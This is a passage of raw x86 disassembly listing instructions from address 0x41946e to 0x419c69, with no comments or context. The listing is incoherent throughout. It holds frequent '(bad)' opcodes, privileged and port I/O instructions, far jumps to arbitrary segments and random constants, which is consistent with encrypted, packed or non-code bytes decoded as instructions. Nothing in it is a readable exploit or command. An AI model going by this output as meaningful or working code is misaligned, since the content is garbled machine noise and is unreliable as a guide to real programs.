  41946e:	repz mov tr3,esp
  419472:	sub    ebp,DWORD PTR [eax-0xd]
  419475:	lahf   
  419476:	dec    esp
  419477:	inc    eax
  419478:	mov    ch,ch
  41947a:	loop   0x4194c3
  41947c:	cs cdq 
  41947e:	mul    dl
  419480:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419481:	adc    DWORD PTR [edi],edi
  419483:	ret    
  419484:	or     eax,0x83aeaaae
  419489:	loope  0x4194f7
  41948b:	and    bl,BYTE PTR [edx-0x6b]
  41948e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41948f:	pop    ss
  419490:	int    0xd6
  419492:	xor    edx,DWORD PTR [esi]
  419494:	in     al,0x35
  419496:	jmp    0x4194fd
  419498:	(bad)  
  419499:	in     eax,dx
  41949a:	pop    edi
  41949b:	adc    eax,DWORD PTR [ebx+0x58]
  41949e:	mov    ds:0x9eb309e6,al
  4194a3:	add    DWORD PTR [ebx+0x3],edi
  4194a6:	push   0xfffffffa
  4194a8:	imul   ecx,edi,0xffffffa4
  4194ab:	dec    ebx
  4194ac:	call   0x7fb8914e
  4194b1:	or     eax,DWORD PTR [edx-0xb]
  4194b4:	pop    ss
  4194b5:	(bad)  
  4194b7:	in     al,dx
  4194b8:	xor    ch,al
  4194ba:	mov    DWORD PTR [eax+0x52],eax
  4194bd:	sub    bh,BYTE PTR [eax+0x391d58e8]
  4194c3:	cs inc eax
  4194c5:	xor    bh,BYTE PTR [esi+0x4f]
  4194c8:	cld    
  4194c9:	ret    0x130
  4194cc:	pop    edx
  4194cd:	cdq    
  4194ce:	mov    ds:0x768dc64,eax
  4194d3:	cmp    DWORD PTR [esp+ebp*2+0x3dafaa0f],ecx
  4194da:	cdq    
  4194db:	frstor [esi+0x19]
  4194de:	retf   0x8eaf
  4194e1:	sbb    BYTE PTR [edx],ch
  4194e3:	jmp    0x4194a4
  4194e5:	fbstp  TBYTE PTR [esi]
  4194e7:	jmp    0x8933:0xbe4b86b9
  4194ee:	lods   al,BYTE PTR ds:[esi]
  4194ef:	dec    edi
  4194f0:	push   0x5a
  4194f2:	add    BYTE PTR [edx],bh
  4194f4:	jns    0x419488
  4194f6:	test   ebp,ecx
  4194f8:	retf   0x4e90
  4194fb:	dec    ecx
  4194fc:	les    edx,FWORD PTR [eax-0x56]
  4194ff:	sub    al,0xa4
  419501:	mov    ah,0xe6
  419503:	arpl   bp,dx
  419505:	mov    cl,0xb1
  419507:	mov    al,0x44
  419509:	cmp    eax,0x28e0c713
  41950e:	jge    0x419496
  419510:	inc    ecx
  419511:	outs   dx,DWORD PTR ds:[esi]
  419512:	test   BYTE PTR [edi],dh
  419514:	cmp    eax,0x3011122c
  419519:	mov    esp,0x3d895d84
  41951e:	or     BYTE PTR [esi],bl
  419520:	jno    0x41959d
  419522:	mov    ecx,0xb35277d3
  419527:	ds mov dl,0x5f
  41952a:	add    edx,DWORD PTR [ebx-0x2d3931ee]
  419530:	shl    WORD PTR [ebp+0x29],1
  419534:	pop    ebx
  419535:	and    BYTE PTR [edx],bl
  419537:	lea    edi,[ebx+0x68e5eb2c]
  41953d:	add    eax,0x96344c5b
  419542:	push   0x6b19cee
  419547:	adc    DWORD PTR [esi],edi
  419549:	push   edi
  41954a:	mov    bh,0xdc
  41954c:	hlt    
  41954d:	dec    eax
  41954e:	enter  0xca74,0x31
  419552:	push   cs
  419553:	add    edi,DWORD PTR [edi]
  419555:	dec    esp
  419556:	fild   DWORD PTR ds:0xf39be092
  41955c:	enter  0xfd2,0x76
  419560:	iret   
  419561:	and    eax,DWORD PTR [ebx+0x31e9241f]
  419567:	stos   BYTE PTR es:[edi],al
  419568:	adc    bh,dl
  41956a:	jb     0x419503
  41956c:	mov    esp,0xf0395b38
  419571:	jmp    0x419525
  419573:	mov    edi,0x3f3075a9
  419578:	repz arpl WORD PTR [eax-0x7067b94b],bx
  41957f:	jge    0x41952b
  419581:	and    al,BYTE PTR [eax+0x4]
  419584:	fwait
  419585:	pop    edx
  419586:	or     BYTE PTR [edx],cl
  419588:	ret    
  419589:	jmp    0x419514
  41958b:	dec    ebp
  41958c:	test   DWORD PTR [ecx],ecx
  41958e:	iret   
  41958f:	lods   al,BYTE PTR ds:[esi]
  419590:	xchg   ebp,eax
  419591:	inc    eax
  419592:	xor    bl,BYTE PTR [eax+edx*8+0x79]
  419596:	pushf  
  419597:	and    ebx,DWORD PTR [ebx-0x4d0188ea]
  41959d:	mov    WORD PTR [ecx],?
  41959f:	xchg   DWORD PTR [eax+esi*8+0x5ff1722c],ebx
  4195a6:	rcr    DWORD PTR [eax],0x22
  4195a9:	mov    al,ds:0x398c9f3d
  4195ae:	dec    ecx
  4195af:	adc    BYTE PTR [ecx+ebx*2-0x40fc4be6],ch
  4195b6:	dec    esp
  4195b7:	icebp  
  4195b8:	pop    es
  4195b9:	mov    ch,0x19
  4195bb:	push   eax
  4195bc:	push   0xffffffeb
  4195be:	and    esi,edx
  4195c0:	in     al,dx
  4195c1:	add    ch,BYTE PTR [eax+0x32c2f499]
  4195c7:	jl     0x41955e
  4195c9:	xchg   ebx,eax
  4195ca:	ins    BYTE PTR es:[edi],dx
  4195cb:	adc    edi,DWORD PTR [ebp+0xe]
  4195ce:	xchg   ebp,eax
  4195cf:	mov    esp,0x6cb3849
  4195d4:	pop    ebp
  4195d5:	mov    esi,0x719794d1
  4195da:	fsub   QWORD PTR [esi-0x221d697a]
  4195e0:	add    eax,0x5ae341ad
  4195e5:	mov    cl,0xc9
  4195e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4195e8:	popf   
  4195e9:	retf   0x9635
  4195ec:	fdiv   DWORD PTR [eax-0x38]
  4195ef:	in     al,dx
  4195f0:	lods   al,BYTE PTR ds:[esi]
  4195f1:	in     al,dx
  4195f2:	push   ecx
  4195f3:	sti    
  4195f4:	sahf   
  4195f5:	jns    0x4195ed
  4195f7:	dec    edi
  4195f8:	jg     0x41961b
  4195fa:	imul   esi,DWORD PTR [ecx+eiz*2],0xffffffa3
  4195fe:	jecxz  0x41961e
  419600:	mov    ebp,edx
  419602:	rol    DWORD PTR [esi],1
  419604:	mov    esp,0xc1d52b27
  419609:	out    dx,al
  41960a:	iret   
  41960b:	and    al,0x37
  41960d:	dec    edx
  41960e:	and    BYTE PTR [esi+0x5b],dh
  419611:	push   ebp
  419612:	and    ebp,DWORD PTR [ecx-0x39]
  419615:	xor    ebx,eax
  419617:	mul    BYTE PTR [edi+0x45]
  41961a:	sahf   
  41961b:	sbb    eax,0x500b2832
  419620:	cmp    eax,0x12b73dd5
  419625:	pop    esi
  419626:	in     eax,dx
  419627:	out    dx,eax
  419628:	dec    ecx
  419629:	xchg   edx,eax
  41962a:	dec    ebp
  41962b:	test   eax,0x618af760
  419630:	je     0x41964d
  419632:	rol    BYTE PTR [ebx-0x15],0xc
  419636:	(bad)  
  419637:	fsub   DWORD PTR [esi]
  419639:	bound  esp,QWORD PTR [eax+edx*1]
  41963c:	loope  0x419646
  41963e:	jmp    0x388c:0xaf2ba1d3
  419645:	cdq    
  419646:	adc    BYTE PTR ds:0x38874d8d,ch
  41964c:	ja     0x419636
  41964e:	inc    eax
  41964f:	fdecstp 
  419651:	jae    0x4196c6
  419653:	idiv   ecx
  419655:	jo     0x419688
  419657:	sbb    eax,0xc477ca7f
  41965c:	xchg   ebp,eax
  41965d:	retf   0x8161
  419660:	stos   BYTE PTR es:[edi],al
  419661:	in     eax,dx
  419662:	stos   BYTE PTR es:[edi],al
  419663:	es or  ch,dh
  419666:	dec    esp
  419667:	dec    ecx
  419668:	xor    dh,BYTE PTR [esi+0x5e]
  41966b:	mov    ch,0xcf
  41966d:	retf   
  41966e:	mov    esi,0x559cb700
  419673:	lock jl 0x41963f
  419676:	jmp    FWORD PTR [edi-0x1d7de662]
  41967c:	dec    ecx
  41967d:	and    eax,0x354e5155
  419682:	xchg   edx,eax
  419683:	out    dx,al
  419684:	iret   
  419685:	into   
  419686:	adc    eax,0xe51c5d19
  41968b:	unpckhps xmm3,xmm5
  41968e:	or     BYTE PTR [eax+0x4f],0x27
  419692:	fs fdivr st,st(6)
  419695:	xchg   BYTE PTR [edi-0x73],bl
  419698:	repnz cmp eax,0xc34c10b5
  41969e:	out    dx,eax
  41969f:	jle    0x419714
  4196a1:	fadd   st,st(4)
  4196a3:	push   edi
  4196a4:	mov    ds:0x8af07a1a,al
  4196a9:	mov    edi,0xcdde5098
  4196ae:	push   ss
  4196af:	fs inc edi
  4196b1:	or     BYTE PTR [edx+0x61],bl
  4196b4:	fisttp WORD PTR [esi+0x6c2eda5a]
  4196ba:	cmp    ah,bl
  4196bc:	xor    BYTE PTR [edi-0x71],0xff
  4196c0:	cmp    DWORD PTR [ebp+0x7d8cccdc],0x41
  4196c7:	jmp    0x4196d6
  4196c9:	ret    
  4196ca:	pop    esi
  4196cb:	jle    0x419680
  4196cd:	pop    eax
  4196ce:	xchg   edi,eax
  4196cf:	mov    cl,0x67
  4196d1:	push   ss
  4196d2:	mov    dh,0xdd
  4196d4:	and    BYTE PTR [esp+eiz*8],cl
  4196d7:	imul   ebp,DWORD PTR [esi],0x12b5843e
  4196dd:	push   0x31699b3b
  4196e2:	mov    ds:0xa0380a81,al
  4196e7:	inc    edi
  4196e8:	pop    ds
  4196e9:	stos   BYTE PTR es:[edi],al
  4196ea:	push   eax
  4196eb:	jp     0x4196ef
  4196ed:	adc    bh,BYTE PTR [edi-0xf03f783]
  4196f3:	call   ebx
  4196f5:	jb     0x41972a
  4196f7:	(bad)  
  4196f8:	mov    al,0xca
  4196fa:	or     DWORD PTR [edx-0x69086fa2],edx
  419700:	push   eax
  419701:	sbb    al,0x5e
  419703:	dec    edx
  419704:	xor    DWORD PTR [ebx],ecx
  419706:	fidivr DWORD PTR [ecx-0x792029e7]
  41970c:	pusha  
  41970d:	leave  
  41970e:	ret    
  41970f:	shr    BYTE PTR [edi+edi*1],1
  419712:	mov    BYTE PTR [ebx+eiz*8+0x21],0x3a
  419717:	bts    DWORD PTR [ecx],esp
  41971a:	out    dx,eax
  41971b:	dec    ebp
  41971d:	mov    eax,0xc2349c88
  419722:	mov    bh,0xf1
  419724:	jbe    0x4196fe
  419726:	mov    ecx,0x366facba
  41972b:	add    DWORD PTR [ecx],edi
  41972d:	data16 daa 
  41972f:	retf   
  419730:	popa   
  419731:	into   
  419732:	xor    eax,0x7197967b
  419737:	imul   ebp,DWORD PTR [ebx+0x5c],0x38
  41973b:	aaa    
  41973c:	sub    DWORD PTR cs:[ecx+0x7b],ebp
  419740:	adc    esp,DWORD PTR [ebx]
  419742:	or     ch,0xbb
  419745:	xor    eax,0x76e82e65
  41974a:	out    0x33,eax
  41974c:	sbb    eax,0x569375b7
  419751:	pop    ecx
  419752:	sbb    BYTE PTR [edx+0x5cac2f37],cl
  419758:	call   0x32b1:0x3d46e415
  41975f:	xor    BYTE PTR [esi+0x60aa36ca],0x59
  419766:	inc    esp
  419767:	outs   dx,BYTE PTR ds:[esi]
  419768:	jo     0x419726
  41976a:	adc    al,0xba
  41976c:	jmp    0x41971c
  41976e:	iret   
  41976f:	mov    edx,0xbf9c83ba
  419774:	pop    esp
  419775:	adc    BYTE PTR [eax],dl
  419777:	inc    ebx
  419778:	lock out dx,al
  41977a:	add    edi,edi
  41977c:	adc    al,0xcb
  41977e:	pop    es
  41977f:	add    DWORD PTR [edx+0xfbd64a5],edx
  419785:	mov    ch,0xaa
  419787:	lock adc DWORD PTR [edx],ebx
  41978a:	imul   ecx,DWORD PTR [ebx],0xffffff9f
  41978d:	in     eax,0x9e
  41978f:	test   BYTE PTR ds:0xd816e649,al
  419795:	enter  0x890a,0x44
  419799:	repz mul DWORD PTR [edx]
  41979c:	push   edi
  41979d:	fwait
  41979e:	mov    ah,0x75
  4197a0:	aad    0x26
  4197a2:	or     eax,0x40b7cda0
  4197a7:	imul   esp,DWORD PTR [ecx+0x45383787],0x60
  4197ae:	cmp    edx,DWORD PTR [ebp+ebp*4+0x6c]
  4197b2:	or     edx,DWORD PTR ds:0x83ccd76a
  4197b8:	inc    ecx
  4197b9:	dec    edi
  4197ba:	adc    eax,0xa6a4a8a1
  4197bf:	cmp    BYTE PTR [ebx+0x3e],cl
  4197c2:	aad    0x33
  4197c4:	and    eax,0xa5f5f717
  4197c9:	retf   0x31ff
  4197cc:	cmpxchg ah,ch
  4197cf:	add    edi,DWORD PTR [edi]
  4197d1:	inc    BYTE PTR [ebp+0x6d83c964]
  4197d7:	loopne 0x419789
  4197d9:	pop    edx
  4197da:	shl    DWORD PTR [esi],0x9e
  4197dd:	and    ecx,DWORD PTR [esi]
  4197df:	mov    cl,0xad
  4197e1:	scas   al,BYTE PTR es:[edi]
  4197e2:	fild   WORD PTR [eax]
  4197e4:	xlat   BYTE PTR ds:[ebx]
  4197e5:	push   DWORD PTR [edi]
  4197e7:	jmp    0x827c:0xd11bb08b
  4197ee:	xchg   edi,eax
  4197ef:	sub    DWORD PTR [edi-0x4dfd8dfa],0x6e805841
  4197f9:	(bad)  
  4197fa:	xchg   edi,eax
  4197fb:	push   edx
  4197fc:	lods   eax,DWORD PTR ds:[esi]
  4197fd:	pop    es
  4197fe:	pop    esi
  4197ff:	rol    ebx,cl
  419801:	out    0x7c,al
  419803:	cmp    eax,0x2e7313d0
  419808:	xor    al,0x12
  41980a:	fst    QWORD PTR [ebp-0x1c]
  41980d:	clc    
  41980e:	idiv   DWORD PTR [esi+0x4ff6bda8]
  419814:	dec    ebx
  419815:	cmp    BYTE PTR [edx+0xd6eaa91],bl
  41981b:	nop
  41981c:	sahf   
  41981d:	out    dx,eax
  41981e:	pushf  
  41981f:	test   BYTE PTR [esi],cl
  419821:	jne    0x4197d1
  419823:	mov    ch,0x96
  419825:	ins    BYTE PTR es:[edi],dx
  419826:	mov    edx,0x5eacc976
  41982b:	int    0x22
  41982d:	lods   al,BYTE PTR ds:[esi]
  41982e:	xor    eax,0x1de1f2bd
  419833:	popf   
  419834:	popa   
  419835:	cwde   
  419836:	inc    esi
  419837:	div    BYTE PTR [ecx-0x48]
  41983a:	lds    eax,FWORD PTR [ecx+0x24]
  41983d:	mov    dh,0xe6
  41983f:	xlat   BYTE PTR ds:[ebx]
  419840:	leave  
  419841:	in     eax,0x37
  419843:	dec    edx
  419844:	addr16 int3 
  419846:	neg    DWORD PTR [edi]
  419848:	jge    0x419883
  41984a:	rcr    esi,1
  41984c:	mov    ds:0x699e9baf,eax
  419851:	mov    edx,0xcb521f3d
  419856:	xchg   ecx,eax
  419857:	xor    eax,0x9d2969d9
  41985c:	hlt    
  41985d:	call   0x46d6e311
  419862:	pop    edi
  419863:	(bad)  
  419864:	ins    DWORD PTR es:[edi],dx
  419865:	and    DWORD PTR [ebx],0x5c797d33
  41986b:	in     eax,0x2d
  41986d:	mov    dh,0xed
  41986f:	les    edx,FWORD PTR ds:0x8545f70
  419875:	pop    edi
  419876:	adc    al,0x91
  419878:	xchg   ebp,eax
  419879:	xchg   ecx,eax
  41987a:	xchg   edi,eax
  41987b:	loope  0x419870
  41987d:	xchg   ebp,eax
  41987e:	mov    ebp,0x6939abf4
  419883:	mov    cl,BYTE PTR [eax]
  419885:	stc    
  419886:	mov    eax,ds:0x2837627d
  41988b:	add    esp,DWORD PTR ds:0x4800784b
  419891:	bound  ebx,QWORD PTR [edx]
  419893:	add    esp,0x74
  419896:	shl    BYTE PTR [edi-0x303e6b0f],0x43
  41989d:	idiv   DWORD PTR [edx+0x2b5b9b14]
  4198a3:	cs and eax,0x75a37583
  4198a9:	pushf  
  4198aa:	add    eax,0x368d3036
  4198af:	rcr    DWORD PTR [ebp-0x3559a66b],0x21
  4198b6:	aam    0x66
  4198b8:	rcl    BYTE PTR [edx+0x3f0280cb],cl
  4198be:	(bad)  
  4198bf:	std    
  4198c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4198c1:	push   ecx
  4198c2:	mov    bl,0x1b
  4198c4:	imul   ebx,DWORD PTR [edx+0x2fef9041],0x72
  4198cb:	pop    ebp
  4198cc:	int3   
  4198cd:	test   esp,esi
  4198cf:	cli    
  4198d0:	adc    BYTE PTR [ebx],cl
  4198d2:	test   BYTE PTR [ebx+0x5b],dl
  4198d5:	in     al,dx
  4198d6:	or     esi,eax
  4198d8:	das    
  4198d9:	outs   dx,BYTE PTR ds:[esi]
  4198da:	and    BYTE PTR ds:0x82f432b6,bl
  4198e0:	aad    0x4f
  4198e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4198e3:	test   al,0xa3
  4198e5:	mov    edx,0x5463b1c2
  4198ea:	mov    dl,0x81
  4198ec:	ret    0xb1db
  4198ef:	clc    
  4198f0:	ficom  WORD PTR [eax+0x3b]
  4198f3:	inc    ecx
  4198f4:	or     eax,0xdc517df5
  4198f9:	mov    ecx,0x79bf175e
  4198fe:	loope  0x419970
  419900:	pop    es
  419901:	push   ss
  419902:	or     dh,BYTE PTR [ebp+0x10]
  419905:	fsubr  DWORD PTR [edx+0x6e]
  419908:	add    esi,edi
  41990a:	xchg   DWORD PTR [ebp+0x14],ecx
  41990d:	push   0xce3a34e1
  419912:	out    dx,eax
  419913:	test   dl,ah
  419915:	pushf  
  419916:	in     al,dx
  419917:	add    BYTE PTR [edi+0x61279f36],0xc6
  41991e:	sub    DWORD PTR [edx-0x3b],0x4d
  419922:	push   ebp
  419923:	mov    WORD PTR ds:0xdaa6dcbb,gs
  419929:	mov    ds:0x420ce1fd,eax
  41992e:	sbb    eax,0x9160793d
  419933:	jno    0x41999b
  419935:	pop    edx
  419936:	xchg   DWORD PTR cs:[ebx+edi*2-0x54],eax
  41993b:	bound  ecx,QWORD PTR [eax-0x68]
  41993e:	inc    eax
  41993f:	pop    ecx
  419940:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419941:	pop    ecx
  419942:	ins    DWORD PTR es:[edi],dx
  419943:	mov    ebx,0xf4e85a4d
  419948:	inc    esi
  419949:	sub    DWORD PTR [ecx],esp
  41994b:	jne    0x41998d
  41994d:	add    edx,edx
  41994f:	sub    dh,BYTE PTR [eax+0x73a596ab]
  419955:	xchg   edi,esp
  419957:	pushf  
  419958:	dec    esp
  419959:	cli    
  41995a:	or     al,0xe1
  41995c:	push   esp
  41995d:	jl     0x4199a6
  41995f:	std    
  419960:	fadd   DWORD PTR [edi*2-0x48044701]
  419967:	or     DWORD PTR [esi-0x4f],eax
  41996a:	sbb    BYTE PTR [edi],al
  41996c:	call   0x50c2:0x4891b529
  419973:	std    
  419974:	dec    esp
  419975:	or     BYTE PTR [eax],cl
  419977:	aaa    
  419978:	pop    ebx
  419979:	mov    esi,DWORD PTR [edx-0x24]
  41997c:	in     al,0xbe
  41997e:	mov    ds:0xd965935,al
  419983:	cdq    
  419984:	out    0xb1,al
  419986:	in     eax,dx
  419987:	out    0xb8,al
  419989:	retf   
  41998a:	in     eax,0xe
  41998c:	jb     0x419930
  41998e:	sub    BYTE PTR [esi-0x22f59d87],bh
  419994:	les    ecx,FWORD PTR [edi]
  419996:	sbb    eax,0xd60ea283
  41999b:	mov    ds:0xcbfc7099,eax
  4199a0:	enter  0x89dc,0x97
  4199a4:	pop    eax
  4199a5:	push   edi
  4199a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4199a7:	mov    bh,0x40
  4199a9:	inc    ecx
  4199aa:	pop    es
  4199ab:	mov    ebp,0x26f5d4e8
  4199b0:	and    DWORD PTR [edx+0x23],edx
  4199b3:	push   ecx
  4199b4:	lock (bad) 
  4199b6:	ret    
  4199b7:	sbb    dl,BYTE PTR [ecx+eiz*2+0x18]
  4199bb:	push   edx
  4199bc:	jne    0x41994d
  4199be:	adc    DWORD PTR [ecx-0x67a25f6f],edi
  4199c4:	pusha  
  4199c5:	push   ss
  4199c6:	jbe    0x4199a2
  4199c8:	mov    ds:0x169cb883,al
  4199cd:	pop    ebp
  4199ce:	jg     0x419a26
  4199d0:	xor    edi,ecx
  4199d2:	cld    
  4199d3:	adc    dh,bl
  4199d5:	dec    ecx
  4199d6:	clc    
  4199d7:	lods   al,BYTE PTR ds:[esi]
  4199d8:	jb     0x4199d9
  4199da:	mov    al,0x57
  4199dc:	daa    
  4199dd:	sahf   
  4199de:	mov    al,0xd
  4199e0:	out    dx,al
  4199e1:	cmc    
  4199e2:	inc    edi
  4199e3:	xor    al,0x22
  4199e5:	adc    DWORD PTR [edi],edi
  4199e7:	mov    ch,0x44
  4199e9:	inc    ebx
  4199ea:	mov    ecx,0x7c774995
  4199ef:	loopne 0x419a44
  4199f1:	fldcw  WORD PTR [ecx-0x67]
  4199f4:	imul   BYTE PTR [edi-0x28463610]
  4199fa:	cdq    
  4199fb:	imul   edx,DWORD PTR [eax-0x89f4825],0xffffffd0
  419a02:	and    eax,0x8c04a60f
  419a07:	push   ebp
  419a08:	sub    BYTE PTR [esi+0x4e9e91e2],dl
  419a0e:	push   es
  419a0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419a10:	mov    BYTE PTR [ecx-0x33ea06d3],0x50
  419a17:	das    
  419a18:	push   0x1b
  419a1a:	push   0x60
  419a1c:	push   eax
  419a1d:	fdivr  st,st(7)
  419a1f:	jnp    0x4199f8
  419a21:	sti    
  419a22:	push   ss
  419a23:	mov    cs,ebp
  419a25:	jne    0x419a86
  419a27:	pop    ss
  419a28:	arpl   WORD PTR [esp+eax*1+0x5bbe16ec],di
  419a2f:	ror    BYTE PTR [eax+ecx*8+0x28],1
  419a33:	idiv   DWORD PTR [edx+eiz*1+0x56db647e]
  419a3a:	add    esi,ecx
  419a3c:	loope  0x4199e6
  419a3e:	addr16 pop ds
  419a40:	sar    DWORD PTR [ebp+0x296c8675],cl
  419a46:	sub    BYTE PTR [esi],0xc
  419a49:	cmp    ebp,edx
  419a4b:	je     0x4199e7
  419a4d:	adc    al,0x75
  419a4f:	dec    ecx
  419a50:	sti    
  419a51:	arpl   WORD PTR [ebx-0x47eb90c9],bp
  419a57:	lds    edi,FWORD PTR [eax+0x69ff802f]
  419a5d:	int3   
  419a5e:	stc    
  419a5f:	repz or ebp,eax
  419a62:	in     al,0x4
  419a64:	push   edx
  419a65:	mov    al,ds:0x4f788336
  419a6a:	int    0x88
  419a6c:	aam    0x17
  419a6e:	es gs jmp 0x5920bf44
  419a75:	lock inc eax
  419a77:	dec    eax
  419a78:	add    eax,0x61f45465
  419a7d:	xor    eax,0xeab99fc2
  419a82:	mov    edi,0xbde0e165
  419a87:	ret    
  419a88:	(bad)  
  419a89:	and    BYTE PTR [eax+0x6730675e],bl
  419a8f:	jle    0x419a68
  419a91:	jno    0x419a97
  419a93:	jle    0x419add
  419a95:	push   ecx
  419a96:	jecxz  0x419a6c
  419a98:	mov    eax,es
  419a9a:	jno    0x419a85
  419a9c:	in     al,dx
  419a9d:	inc    eax
  419a9e:	out    dx,al
  419a9f:	mov    edi,0x631775b
  419aa4:	inc    edi
  419aa5:	repnz dec edx
  419aa7:	jle    0x419af6
  419aa9:	inc    ecx
  419aaa:	adc    bh,BYTE PTR [edi]
  419aac:	in     eax,dx
  419aad:	dec    ebx
  419aae:	ror    DWORD PTR [ebx+edx*8+0x6f],1
  419ab2:	lahf   
  419ab3:	adc    edx,ebp
  419ab5:	mov    ds:0x859c033a,eax
  419aba:	ror    bh,0xb9
  419abd:	jne    0x419b0c
  419abf:	jmp    0xe2e0bbea
  419ac4:	dec    ebx
  419ac5:	aas    
  419ac6:	or     al,0x34
  419ac8:	scas   al,BYTE PTR es:[edi]
  419ac9:	nop
  419aca:	mov    ah,0xc4
  419acc:	or     al,0xa0
  419ace:	fist   WORD PTR [edx]
  419ad0:	popa   
  419ad1:	arpl   WORD PTR [edx+0x632a1a08],bx
  419ad7:	xor    al,0xca
  419ad9:	mov    ch,0x13
  419adc:	push   eax
  419add:	xor    edx,ebx
  419adf:	in     al,dx
  419ae0:	pop    ds
  419ae1:	addr16 dec edx
  419ae3:	mov    ecx,edi
  419ae5:	or     BYTE PTR [esi],dl
  419ae7:	push   cs
  419ae8:	or     BYTE PTR [edx+0x27e2b959],dl
  419aee:	pop    esp
  419aef:	sub    al,0x2a
  419af1:	mov    al,0x4
  419af3:	sbb    eax,0x6cc53d5d
  419af8:	lock std 
  419afa:	mov    ds:0xee39463d,eax
  419aff:	push   edx
  419b00:	popa   
  419b01:	imul   BYTE PTR [eax]
  419b03:	jo     0x419b2e
  419b05:	inc    ecx
  419b06:	xchg   esi,eax
  419b07:	jecxz  0x419b31
  419b09:	dec    eax
  419b0a:	rcl    DWORD PTR [ebx+edx*8+0x45],cl
  419b0e:	add    BYTE PTR ss:[edi-0x75],dh
  419b12:	add    dl,ah
  419b14:	ja     0x419aa6
  419b16:	xchg   edi,eax
  419b17:	inc    edi
  419b18:	add    DWORD PTR [ecx+0x66],ebx
  419b1b:	pop    edi
  419b1c:	mov    bl,0xcc
  419b1e:	sub    al,0xee
  419b20:	fdivr  QWORD PTR [esi-0x44d6a206]
  419b26:	sbb    ah,BYTE PTR [eax]
  419b28:	adc    DWORD PTR ds:[ebx+0x75],edi
  419b2c:	(bad)  
  419b2d:	ret    0xa31d
  419b30:	sbb    eax,0x76d12d2a
  419b35:	test   DWORD PTR ds:0x6f6af603,eax
  419b3b:	mov    ah,ah
  419b3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b3e:	or     ch,ch
  419b40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b41:	inc    ebp
  419b42:	leave  
  419b43:	mov    ah,0x3b
  419b45:	(bad)  
  419b46:	sbb    ebx,DWORD PTR [ecx+ebp*1+0x7f]
  419b4a:	inc    esi
  419b4b:	and    eax,0x6b53abef
  419b50:	push   ebx
  419b51:	inc    esi
  419b52:	aaa    
  419b53:	sbb    ch,0x73
  419b56:	gs stc 
  419b58:	sub    dl,BYTE PTR [ecx]
  419b5a:	inc    esp
  419b5b:	cmp    BYTE PTR [ebx-0x23],dh
  419b5e:	out    0xf7,eax
  419b60:	jns    0x419bd1
  419b62:	sahf   
  419b63:	jns    0x419b66
  419b65:	sub    ah,BYTE PTR [ebx]
  419b67:	cs (bad) 
  419b69:	mov    BYTE PTR [ebx],bl
  419b6b:	(bad)  
  419b6d:	pop    edi
  419b6e:	mov    edi,0x387f66a2
  419b73:	mov    al,ds:0xd5e3b5b5
  419b78:	pop    esp
  419b79:	(bad)  
  419b7a:	scas   al,BYTE PTR es:[edi]
  419b7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b7c:	test   al,0xac
  419b7e:	push   ss
  419b7f:	mov    esi,0xf2728fb2
  419b84:	cmc    
  419b85:	test   ecx,esp
  419b87:	adc    eax,0x99570122
  419b8c:	sub    eax,0xdd2c777a
  419b91:	xlat   BYTE PTR ds:[ebx]
  419b92:	mov    edx,0xd19d154b
  419b97:	jl     0x419b19
  419b99:	repnz mov edx,0xdd6b21e1
  419b9f:	lods   eax,DWORD PTR ds:[esi]
  419ba0:	test   ah,bl
  419ba2:	cli    
  419ba3:	test   DWORD PTR [ecx],edi
  419ba5:	shl    BYTE PTR [ebp-0x9],cl
  419ba8:	loop   0x419c01
  419baa:	jmp    0xdb28:0x5b4967f0
  419bb1:	mov    al,ds:0x5b1ab107
  419bb6:	ficomp WORD PTR [esp+edx*4-0x25]
  419bba:	sub    ebx,edx
  419bbc:	adc    al,0x4c
  419bbe:	rcr    BYTE PTR [ebx-0x2cdc5d1c],0x26
  419bc5:	and    DWORD PTR [ebp+0x426275],ebp
  419bcb:	gs enter 0x5a70,0xf8
  419bd0:	mov    ah,0xf0
  419bd2:	or     al,0xdc
  419bd4:	xor    DWORD PTR [esi-0x51697582],eax
  419bda:	cmc    
  419bdb:	pop    es
  419bdc:	inc    ecx
  419bdd:	mov    BYTE PTR [ebp+0x4f],ch
  419be0:	push   edx
  419be1:	sbb    ecx,DWORD PTR [ebx+0x27]
  419be4:	and    dh,BYTE PTR [edi+0x63fd380b]
  419bea:	sub    BYTE PTR [edi-0x202e7364],0x6f
  419bf1:	mov    cl,0xde
  419bf3:	out    0x22,eax
  419bf5:	ss cmp edi,ebx
  419bf8:	dec    ecx
  419bf9:	jle    0x419b80
  419bfb:	mov    ch,0x5
  419bfd:	arpl   WORD PTR [esi+eiz*1],ax
  419c00:	mov    edi,0xee53a8b7
  419c05:	les    esp,FWORD PTR [esi+0x49b23ba3]
  419c0b:	dec    eax
  419c0c:	mov    ecx,0x8d57f5d
  419c11:	pop    ecx
  419c12:	sbb    ecx,ebx
  419c14:	in     eax,0x7e
  419c16:	std    
  419c17:	mov    ebx,0x1252d896
  419c1c:	dec    edi
  419c1d:	frstor [ecx-0x5461dfab]
  419c23:	add    bl,BYTE PTR [ebx-0x65]
  419c26:	clc    
  419c27:	je     0x419bce
  419c29:	shr    DWORD PTR [ecx-0x8d0a0ce],1
  419c2f:	sub    ebp,DWORD PTR [edx-0x6e]
  419c32:	outs   dx,BYTE PTR ds:[esi]
  419c33:	ret    0x3c84
  419c36:	jecxz  0x419c92
  419c38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c39:	std    
  419c3a:	mov    DWORD PTR fs:[eax+0x30e10256],0x9db32a3b
  419c45:	and    ebx,DWORD PTR [esi-0x7a4824f8]
  419c4b:	(bad)  
  419c4c:	fnstcw WORD PTR [edx+0x5578ee9d]
  419c52:	in     al,dx
  419c53:	leave  
  419c54:	inc    ecx
  419c55:	cs ret 0x43c3
  419c59:	fidiv  WORD PTR [esi+0x2]
  419c5c:	lds    eax,FWORD PTR [edx+0x2720735d]
  419c62:	imul   ebp,DWORD PTR [eax+0x3e86afd1],0x73
  419c69:	bound  edi,QWORD PTR [edx-0x57]
